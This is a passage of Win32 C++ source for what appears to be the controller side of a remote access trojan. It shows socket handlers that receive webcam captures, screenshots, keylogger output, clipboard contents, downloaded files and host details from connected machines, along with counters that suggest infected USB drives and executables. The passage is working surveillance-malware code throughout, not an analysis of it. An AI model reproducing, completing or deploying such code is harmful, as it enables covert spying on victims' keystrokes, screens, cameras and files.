        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_WEB), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);


        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TXT), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);


        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PDF), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);




        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SETUP), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_VID), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



     /* hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_EXE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/

       /* hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ZIP), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/

       /* hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_DOC), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/

     /*   hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_IMG), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/

        /*hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_WEB), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);


        hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_TXT), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/


       /* hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_VID2), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/


        /*hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_UNK), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/

        /* hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_PDF), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(FImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/


        TImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
        ImageList_SetBkColor(TImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]



        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PROC), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(TImageList,hBitMap,NULL);
        DeleteObject(hBitMap);


        hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_WINDOWS), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(TImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);


        hList7=GetDlgItem(hwndDlg,IDC_LIST7);

        memset(&LvCol,0,sizeof(LvCol));                  // Zero Members
        LvCol.cx=/*0x28*/20;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList7, exStyles);
        LvCol.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol.cx=40;                                   // width of column
        LvCol.pszText="#";                            // First Header Text
        SendMessage(hList7,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol); // Insert/Show the coloum
        LvCol.cx=190;                                   // width of column
        LvCol.pszText="Taskname";                            // Next coloum
        SendMessage(hList7,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol); // ...
        LvCol.cx=170;                                   // width of column
        LvCol.pszText="Username";                            // Next coloum
        SendMessage(hList7,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol); // ...
        LvCol.cx=180;                                   // width of column
        LvCol.pszText="Time";                            //
        SendMessage(hList7,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol); //
        /*LvCol.cx=120;
        LvCol.pszText="Status";                            //
        SendMessage(hList7,LVM_INSERTCOLUMN,4,(LPARAM)&LvCol); //*/

        memset(&LvItem,0,sizeof(LvItem)); // Zero struct's Members

        LvItem.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem.cchTextMax = 256; // Max size of test
        LvItem.iItem=0;          // choose item
        LvItem.iSubItem=0;       // Put in first coluom



        //ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockImageList, LVSIL_SMALL);

        hList8=GetDlgItem(hwndDlg,IDC_LIST8);

        memset(&LvCol,0,sizeof(LvCol));                  // Zero Members
        LvCol.cx=/*0x28*/20;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList8, exStyles);
        LvCol.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol.cx=40;                                   // width of column
        LvCol.pszText="#";                            // First Header Text
        SendMessage(hList8,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol); // Insert/Show the coloum
        LvCol.cx=140;                                   // width of column
        LvCol.pszText="Socket";                            // Next coloum
        SendMessage(hList8,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol); // ...
        LvCol.cx=240;                                   // width of column
        LvCol.pszText="Action";                            // Next coloum
        SendMessage(hList8,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol); // ...
        LvCol.cx=110;
        LvCol.pszText="Port";                            // Next coloum
        SendMessage(hList8,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol); // ...
        LvCol.cx=180;
        LvCol.pszText="Time";                            // Next coloum
        SendMessage(hList8,LVM_INSERTCOLUMN,4,(LPARAM)&LvCol); // ...
        /*LvCol.cx=100;
        LvCol.pszText="Status";                            // Next coloum
        SendMessage(hList8,LVM_INSERTCOLUMN,5,(LPARAM)&LvCol); // ...*/
        memset(&LvItem,0,sizeof(LvItem)); // Zero struct's Members

        LvItem.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem.cchTextMax = 256; // Max size of test
        LvItem.iItem=0;          // choose item
        LvItem.iSubItem=0;       // Put in first coluom

        ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),MhImageList, LVSIL_SMALL);
        ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST7),UTLImageList, LVSIL_SMALL);
        ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST8),SockImageList, LVSIL_SMALL);


            if(strstr(ListenOnStart,"ON"))
            {
               Listen(hwndDlg);
               UtilListen(hwndDlg);
               FileListen(hwndDlg);
            }

            if(strstr(RefreshUsers,"ON"))
            {
              RefHandle = CreateThread(NULL, 0,REFRESH_USERS,(LPVOID)"", 0, &thread);
            }


            AddSysTrayNotifier(hwndDlg);



    }
    return TRUE;



    /*case WM_CTLCOLORDLG:
        return (LONG)g_hbrBackground;*/

		case SYSTRAY_MSG:
		{
			switch ( LOWORD ( lParam ) )
			{
				// When people presses the left or right mouse button
				case WM_LBUTTONUP:
				case WM_RBUTTONUP:
				//case WM_LBUTTONDOWN:
				{
					// Load the menu into the memory
					HMENU Menu = LoadMenu ( GetModuleHandle ( NULL ), MAKEINTRESOURCE ( ID_SYSTRAY_MENU ) );
					// Load the submenu from the loaded menu
					Menu = GetSubMenu ( Menu, 0 );
					// If loaded fails, give an error message, else, show an contextmenu


						// Retrieve the current mouse position
						POINT p;
						GetCursorPos ( &p );

						// Load the bitmaps from the resource files into the memory
						HBITMAP bmpClose = LoadBitmap ( GetModuleHandle ( NULL ), MAKEINTRESOURCE ( IDB_EXIT ) );
						HBITMAP bmpAbout = LoadBitmap ( GetModuleHandle ( NULL ), MAKEINTRESOURCE ( IDB_ABTICO ) );
						HBITMAP bmpSetting = LoadBitmap ( GetModuleHandle ( NULL ), MAKEINTRESOURCE ( IDB_CFIG ) );

						// Add the bitmaps to the menuitems
						SetMenuItemBitmaps ( Menu, ID_MMENU_EXIT, MF_BYCOMMAND, bmpClose, bmpClose );
						SetMenuItemBitmaps ( Menu, ID_MMENU_OPTION_SETTING, MF_BYCOMMAND, bmpSetting, bmpClose );
						SetMenuItemBitmaps ( Menu, ID_MMENU_ABOUT, MF_BYCOMMAND, bmpAbout, bmpClose );

						// Show the context menu
						TrackPopupMenuEx ( Menu, TPM_LEFTALIGN, p.x, p.y, hwndDlg, NULL );
				}

			}

		}
		return TRUE;

        case WM_LBUTTONDOWN:
           {
		    GetCursorPos(&pt);
		    GetWindowRect(GetDlgItem(hwndDlg, IDC_EXT_MAIN), &rect);

	     	if(PtInRect(&rect, pt))
		   {
		    ExitProcess(0);
		   }

		   else
		   {
		    SendMessage(hwndDlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		   }


           break;
           }



	case WM_MOUSEMOVE:
	{


		GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndDlg, IDC_EXT_MAIN), &rect);

		if(PtInRect(&rect, pt))
		{
			SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
            mIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
            SendMessage(GetDlgItem(hwndDlg,IDC_EXT_MAIN ), STM_SETICON, (WPARAM)mIcon, (LPARAM)0);
		}


	/*	else
		{
			SetCursor(LoadCursor(NULL, IDC_ARROW));
            hIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCEL), IMAGE_ICON, 16, 16, 0);
	     	SendMessage(GetDlgItem(hwnd, IDC_CANCEL_BTN), STM_SETICON, (WPARAM)hIcon, (LPARAM)0);
		}*/
	}
    break;




    case WM_FILE_SOCKET:
    {
        switch(WSAGETSELECTEVENT(lParam))
        {
        case FD_READ:
        {
            RSizeKB = recv(wParam,(char*)&DLRECV,DLRecvSize,0);
            RecvDataKB+=RSizeKB;
            SetStatsDB(0,RSizeKB,0,0,0,0,0,0,0);
            UpdateStats();
            switch(DLRECV.PacketType)
            {



            case SET_FDLOAD:
            {
                DL_filesize = DLRECV.DLFLen;
                //SendMessage(hStatus2, SB_SETTEXT, 0, (LPARAM)"Dowloading");
                SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETRANGE32 , 0, DLRECV.DLFLen);

                //FileDloadHandle = CreateThread(NULL, 0,SET_FILEDLOAD,(LPVOID)"", 0, &thread);

            }
            break;

            case FDLOAD:
            {


                //if(filesizecheck<DL_filesize)
                //{
                 DLFile = fopen(DLfilename, "a+b");
                 fwrite(DLRECV.FDload, sizeof(DLRECV.FDload),1, DLFile);
                 filesizecheck+=sizeof(DLRECV.FDload);
                 SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM)filesizecheck,0 );
                 ZeroMemory(&DLRECV.FDload[0],sizeof(&DLRECV.FDload));
                 fclose(DLFile);


               // }


               /* else
                {
                DLFile = fopen(DLfilename, "wb");
                fwrite(DLRECV.FDload, DL_filesize,1, DLFile);
                SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM)DL_filesize,0 );
                ZeroMemory(&DLRECV.FDload[0],sizeof(&DLRECV.FDload));
                fclose(DLFile);
                }*/
                //FileDloadHandle = CreateThread(NULL, 0,FILEDLOAD,(LPVOID)"", 0, &thread);


            }
            break;


            case END_FDLOAD:
            {
                filesizecheck = 0;
                //SendMessage(hStatus2, SB_SETTEXT, 0, (LPARAM)"Done");
                strcat(DLfilename,"\n");
                strcat(DLfilename,DLRECV.DLFSize);
                MessageBox(hwndDLstat,DLfilename,"Download Complete", MB_OK | MB_ICONINFORMATION);
                sprintf(DownloadON,"%s","OFF");

                /*GetTime();
                  DLLogStat = -1;
                  DLLogPic = 0;
                  sprintf(DLLogTime, "%s",Time);
                  SetDloadLog(DLLogPic, DLLogStat, DLLogFilename, DLLogFilesize, DLLogUsrname, DLLogDestPath, DLLogTime);*/

                //Sleep(1);
                 SetStatsDB(0,0,0,0,0,1,DL_filesize,0,0);
                 UpdateStats();

                 EndDialog(hwndDLstat,0);
                //FileDloadHandle = CreateThread(NULL, 0,END_FILEDLOAD,(LPVOID)"", 0, &thread);

                GetTime();
                sprintf(DLLogFilename, "%s",FTemp);
                sprintf(DLLogDestPath,  "%s", DLfilename);
                sprintf(DLLogFilesize, "%d",DL_filesize);
                strcat(DLLogFilesize," bytes");
                sprintf(DLLogTime, "%s",Time);
                //sprintf(DLLogUsrname, "%s", MTemp);

                InitSettings();

                if(strstr(KeepDloadLog,"ON"))
                {
                SetDloadLog(0, DLLogFilename, DLLogFilesize, DLLogUsrname, DLLogDestPath, DLLogTime);
                }

                ZeroMemory(&DLfilename[0],sizeof(&DLfilename));




            }
            break;




            }

        }
        break;

        case FD_ACCEPT:
        {
            if(FClient<nMaxClients)
            {
                int size=sizeof(sockaddr);
                FSocket[FClient]=accept(wParam,&FsockAddrClient,&size);
                if (USocket[FClient]==INVALID_SOCKET)
                {
                    int nret = WSAGetLastError();
                    WSACleanup();
                }
            }
            FClient++;

            sprintf(LSSocket, "%s","File Socket");
            sprintf(LSAction, "Connection established with %s",RECV.IP_add);
            sprintf(LSStatus, "%s","Pass");
            sprintf(LSPort, "%s", FPort);

            SetSockLog(LSSocket,LSAction,LSPort,Time,0);

        }
        break;

        case FD_CLOSE:
        {

            GetTime();
            sprintf(LSSocket, "%s","Download/Upload Socket");
            sprintf(LSAction, "%s","Closed");
            sprintf(LSStatus, "%s","Pass");
            sprintf(LSPort, "%s", FPort);

            //SetSockLog(LSSocket,LSAction,LSPort,Time,LSStatus);

        }
        break;


        }
    }
    return TRUE;








    case WM_UTILITY_SOCKET:
    {
        switch(WSAGETSELECTEVENT(lParam))
        {
        case FD_READ:
        {
            RSizeKB = recv(wParam,(char*)&FRECV,FRecvSize,0);
            RecvDataKB+=RSizeKB;
            SetStatsDB(0,RSizeKB,0,0,0,0,0,0,0);
            UpdateStats();

            switch(FRECV.PacketType)
            {



            case SET_CAP_CAM:
            {
                //ZeroMemory(&Cam_dump[0],sizeof(Cam_dump));
                //Cam_dump = new char[FRECV.ActPicLen];
                cam_filesize = FRECV.ActPicLen;
                SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETRANGE32 , 0,cam_filesize);
                _unlink(CamRDir);
            }
            break;



            case CAP_WEBCAM:
            {
                if((lstrlen(FRECV.Cam_Cap))!=0)
                {
                    //if(sizecheck<cam_filesize)
                    //{
                        pFile = fopen(CamRDir, "a+b");
                        fwrite(FRECV.Cam_Cap, sizeof(FRECV.Cam_Cap),1, pFile);
                        sizecheck+=sizeof(FRECV.Cam_Cap);
                        SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)sizecheck,0 );
                        ZeroMemory(&FRECV.Cam_Cap[0],sizeof(&FRECV.Cam_Cap));
                        fclose(pFile);

                   // }

                    /*else
                    {
                        pFile = fopen(CamRDir, "wb");
                        fwrite(FRECV.Cam_Cap, FRECV.ActPicLen,1, pFile);
                        SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)cam_filesize,0 );
                        ZeroMemory(&FRECV.Cam_Cap[0],sizeof(&FRECV.Cam_Cap));
                        fclose(pFile);
                    }*/

                }
            }
            break;


            case END_CAP_CAM:
            {



                EndDialog(hwndwebsht,0);
                EndDialog(hwndShotstat,0);
                sizecheck = 0;
                Sleep(1);

                CreateThread(NULL, 0,WebShotWindow,(LPVOID)lParam, 0,0);
                SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)0,0 );



            }
            break;



            case SET_CAP_SCREEN:
            {
                //ZeroMemory(&Screen_dump[0],sizeof(Screen_dump));
                //Screen_dump = new char[FRECV.ActPicLen];
                scr_filesize = FRECV.ActPicLen;
                SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETRANGE32 , 0,scr_filesize );
                _unlink(ScrRDir);
            }
            break;


            case CAP_SCREEN:
            {

                if((lstrlen(FRECV.Scr_Cap))!=0)
                {

                    //scrFile = fopen(ScrRDir, "a+b");
                    if(sizecheck<scr_filesize)
                    {
                        scrFile = fopen(ScrRDir, "a+b");

                        //ONsendScreen(FRECV.Scr_Cap);
                        fwrite(FRECV.Scr_Cap,sizeof(FRECV.Scr_Cap),1, scrFile);
                        sizecheck+=sizeof(FRECV.Scr_Cap);
                        SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)sizecheck,0 );
                        ZeroMemory(&FRECV.Scr_Cap[0],sizeof(&FRECV.Scr_Cap));
                        fclose(scrFile);

                        //break;
                    }


                   else
                    {

                        scrFile = fopen(ScrRDir, "wb");
                        fwrite(FRECV.Scr_Cap,FRECV.ActPicLen,1, scrFile);
                        SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)scr_filesize,0 );
                        ZeroMemory(&FRECV.Scr_Cap[0],sizeof(&FRECV.Scr_Cap));
                        fclose(scrFile);

                    }



                    //ONsendScreen(FRECV.Scr_Cap);

                }
            }
            break;




            case END_CAP_SCREEN:
            {


                EndDialog(hwndScrSht,0);
                EndDialog(hwndShotstat,0);
                //ShellExecute(NULL, "open", ScrRDir, NULL, NULL, SW_SHOWNORMAL);
                sizecheck = 0;
                //Sleep(1);


                CreateThread(NULL, 0,ScrShotWindow,(LPVOID)lParam, 0,0);
                SendMessage(GetDlgItem(hwndMain,IDC_SHOTPROGRESS), PBM_SETPOS ,(WPARAM)0,0 );



            }
            break;


            case SET_KEYLOG:
            {
                //log_filesize = FRECV.ActPicLen;
                //log_filesize = sizeof(FRECV.Keylog);
                //LogHistory = new char[log_filesize];
                //LogHistory2 = new char[log_filesize];
                //unlink("klog.txt");
                SetDlgItemText(hwndKeylog,IDC_DISP_LOG,"");
                ZeroMemory(&LogHistory[0],sizeof(LogHistory));

            }
            break;



            case LOGS_SENT:
            {
                if(sizecheck<log_filesize)
                {
                   // LOGFILE = fopen ("klog.txt","a+b");

                   // fwrite(FRECV.Keylog,sizeof(FRECV.Keylog),1, LOGFILE);
                    sizecheck+=sizeof(FRECV.Keylog);
                    strcat(LogHistory,FRECV.Keylog);
                    ZeroMemory(&FRECV.Keylog[0],sizeof(&FRECV.Keylog));
                    //fclose(LOGFILE);

                }

                else
                {
                    //LOGFILE = fopen("klog.txt", "wb");
                   // fwrite(FRECV.Keylog,FRECV.ActPicLen,1, LOGFILE);
                    SetDlgItemText(hwndKeylog,IDC_DISP_LOG,FRECV.Keylog);
                    //strcat(LogHistory,FRECV.Keylog);
                    //ZeroMemory(&FRECV.Keylog[0],sizeof(&FRECV.Keylog));
                    //fclose(LOGFILE);


                }
                //CreateThread(NULL, 0,KeyLogWindow,(LPVOID)lParam, 0,0);
                //strcat(LogHistory,"\r\n");
                //strcat(LogHistory,FRECV.Keylog);
                //strcat(LogHistory,"\r\n");

                //ofstream logfile("klog.txt",ios::app);
                //logfile<<FRECV.Keylog;
                //logfile.close();

                //SetDlgItemText(hwndKeylog,IDC_DISP_LOG,"TESTING");
                //SetWindowText(GetDlgItem(hwndKeylog,IDC_DISP_LOG), "TESTING");
                //SetDlgItemText(hwndKeylog,IDC_DISP_LOG,LogHistory);
                //ZeroMemory(&FRECV.Keylog[0],sizeof(FRECV.Keylog));
            }
            break;



            case END_KEYLOG:
            {
                //FILE* DispLog;
                //long offset;
                //char logz[MAX_LEN]={0};
                //CreateThread(NULL, 0,KeyLogWindow,(LPVOID)lParam, 0,0);

                //DispLog = fopen ("klog.txt","r");
                /* ifstream DispLog("klog.txt");

                 if(DispLog.is_open())
                 {
                     while(!DispLog.eof())
                     {
                         DispLog.read(LogHistory,log_filesize);

                         if(DispLog.eof())
                         break;
                     }
                 }
                 DispLog.close();*/

                /* while(!feof(DispLog))
                 {
                    //offset = ftell(DispLog);
                    //fseek(DispLog, offset, 0);
                    //fread(LogHistory,1,log_filesize,DispLog);
                    //strcat(LogHistory2,logz);
                    //strcat(LogHistory,"\r\n");

                  if (feof(DispLog))
                  break;
                 }
                 fclose(DispLog);*/

                //SetDlgItemText(hwndKeylog,IDC_DISP_LOG,LogHistory);
                //SetWindowText(GetDlgItem(hwndKeylog,IDC_DISP_LOG), "TESTING");
                SetDlgItemText(hwndKeylog,IDC_DISP_LOG,FRECV.Keylog);
                sizecheck = 0;
                //Sleep(1);
                //SetDlgItemText(hwndKeylog,IDC_DISP_LOG,LogHistory);


            }
            break;


            case SEND_CLIP_BOARD:
            {

                GetTime();
                int Itemindex;
                Itemindex=SendMessage(hList12,LVM_GETITEMCOUNT,0,0);
               // ListView_SetImageList(GetDlgItem(hwndFile, IDC_LIST12),FImageList, LVSIL_SMALL);


                if(lstrlen(FRECV.ClipBoard) !=0)
                {

                    LvItem2.iItem=Itemindex;            // item will be put at itemIndex
                    LvItem2.iSubItem=0;                 // adding item, no need subitems
                    LvItem2.pszText=Time;          // set pointer to the item text
                    //LvItem2.iImage= 10;
                    SendMessage(hList12,LVM_INSERTITEM,0,(LPARAM)&LvItem2); // put it


                    LvItem2.pszText=FRECV.ClipBoard;
                    LvItem2.iSubItem=1;
                    SendMessage(hList12,LVM_SETITEM,0,(LPARAM)&LvItem2); // Enter text to SubItems



                }

            }
            break;



            case COPY_CLIP_BOARD:
            {
                SetClipboard(FRECV.ClipBoard);
            }
            break;


            case SEND_DATABASE:
            {
            SetStatsDB(0,0,0,FRECV.infusb,FRECV.infexe,0,0,0,0);
            UpdateStats();
            }
            break;




            /*case SET_FDLOAD:
            {
              DL_filesize = FRECV.ActPicLen;
              SendMessage(hStatus2, SB_SETTEXT, 0, (LPARAM)"Dowloading");
              SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,0,FRECV.ActPicLen );


            }
            break;

            case FDLOAD:
            {


                    if(filesizecheck<DL_filesize)
                    {
                     DLFile = fopen(DLfilename, "a+b");
                     fwrite(FRECV.FDload, sizeof(FRECV.FDload),1, DLFile);
                     filesizecheck+=sizeof(FRECV.FDload);
                     SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM)filesizecheck,0 );
                     ZeroMemory(&FRECV.FDload[0],sizeof(&FRECV.FDload));
                     fclose(DLFile);


                     //_unlink(CamRDir);
                    }


                    else
                    {
                    DLFile = fopen(DLfilename, "wb");
                    fwrite(FRECV.FDload, DL_filesize,1, DLFile);
                    SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM)sizeof(FRECV.FDload),0 );
                    ZeroMemory(&FRECV.FDload[0],sizeof(&FRECV.FDload));
                    fclose(DLFile);
                    }

                    //SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM),0 );

            }
            break;


            case END_FDLOAD:
            {
               filesizecheck = 0;
               SendMessage(hStatus2, SB_SETTEXT, 0, (LPARAM)"Done");
               //EnableWindow(GetDlgItem(hwndFile,IDC_DOWNLOAD_FILE ), TRUE);
               MessageBox(NULL,DLfilename,"Download Complete", MB_OK | MB_ICONINFORMATION);
               ZeroMemory(&DLfilename[0],sizeof(&DLfilename));

               SendMessage(GetDlgItem(hwndDLstat,IDC_DLPROGRESS), PBM_SETPOS ,(WPARAM)0,0 );

            }
            break;*/




            }

        }
        break;

        case FD_ACCEPT:
        {
            if(UClient<nMaxClients)
            {
                int size=sizeof(sockaddr);
                USocket[UClient]=accept(wParam,&UsockAddrClient,&size);
                if (USocket[UClient]==INVALID_SOCKET)
                {
                    int nret = WSAGetLastError();
                    WSACleanup();
                }
            }
            UClient++;

            sprintf(LSSocket, "%s","Utility Socket");
            sprintf(LSAction, "Connection established with %s",RECV.IP_add);
            sprintf(LSStatus, "%s","Pass");
            sprintf(LSPort, "%s", UPort);

            SetSockLog(LSSocket,LSAction,LSPort,Time,0);

            SEND.PacketType = REQ_DATABASE;
            SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

        }
        break;


        case FD_CLOSE:
        {

            GetTime();
            sprintf(LSSocket, "%s","Utility Socket");
            sprintf(LSAction, "%s","Closed");
            sprintf(LSStatus, "%s","Pass");
            sprintf(LSPort, "%s", UPort);

            //SetSockLog(LSSocket,LSAction,LSPort,Time,LSStatus);

        }
        break;

        }
    }
    return TRUE;


    case WM_SOCKET:
    {
        LvItem2.iImage=0;
        switch(WSAGETSELECTEVENT(lParam))
        {
        case FD_READ:
        {
            //for(int n=-1;n<=Count_Connection;n++)
            //{
            RSizeKB = recv(wParam,(char*)&RECV,HeadSize1,0);
            RecvDataKB+=RSizeKB;
            SetStatsDB(0,RSizeKB,0,0,0,0,0,0,0);
            UpdateStats();
            switch(RECV.PacketType)
            {

            case REQ_AUTO_SOCK:
            {
              SEND.UPort = atoi(UPort);
              SEND.FPort = atoi(FPort);
              SEND.PacketType = SEND_AUTO_SOCK;
              SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
              SendDataKB+=SSizeKB;
              SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);

              Sleep(1);

              SEND.PacketType = INIT_FSOCK;
              SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
              SendDataKB+=SSizeKB;
              SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);

              Sleep(1);

              SEND.PacketType = INIT_DLFSOCK;
              SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
              SendDataKB+=SSizeKB;
              SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);

              UpdateStats();

            }
            break;

            case AUTH_FAIL:
            {
                DialogBox(GInstance,(LPCTSTR)AUTH_FAIL_DLG,hwndMain,(DLGPROC)AuthFail_DlgProc);
            }
            break;

            case REQ_SEC_PASS:
            {
              GetSettingsDatabase();

              strcpy(SEND.SEC_PASS,CpassDB);

              SEND.PacketType = SEND_SEC_PASS;
              SSizeKB=send(Socket[Count_Connection],(char*)&SEND,HeadSize2,0);
              SendDataKB+=SSizeKB;
              SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
              UpdateStats();
              Sleep(1);
            }
            break;

            case COMPUTER_INFO:

            {
                int Itemindex,i;

                sprintf(Temp,"%d",Count_Connection );
                ListView_SetImageList(GetDlgItem(hwndMain, IDC_LIST),MhImageList, LVSIL_SMALL);
                Itemindex=SendMessage(hList,LVM_GETITEMCOUNT,0,0);
                //sprintf(Temp,"%d",Itemindex );


                LvItem.iItem=Itemindex;            // item will be put at itemIndex
                LvItem.iSubItem=0;                 // adding item, no need subitems
                LvItem.iImage=0;                 // adding item, no need subitems
                LvItem.pszText="";          // set pointer to the item text
                SendMessage(hList,LVM_INSERTITEM,0,(LPARAM)&LvItem); // put it



                LvItem.pszText=RECV.IP_add;
                LvItem.iSubItem=1;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



                LvItem.pszText=RECV.cpt_name;
                LvItem.iSubItem=2;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


                LvItem.pszText=RECV.OS_Ver;
                LvItem.iSubItem=3;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems


                LvItem.pszText=RECV.User;
                LvItem.iSubItem=4;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems




                LvItem.pszText=RECV.Admin;
                LvItem.iSubItem=5;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems




                LvItem.pszText=RECV.RAM_Size;
                LvItem.iSubItem=6;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems





                LvItem.pszText=RECV.Processor_specs;
                LvItem.iSubItem=7;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems




                LvItem.pszText=RECV.Time;
                LvItem.iSubItem=8;
                SendMessage(hList,LVM_SETITEM,0,(LPARAM)&LvItem); // Enter text to SubItems



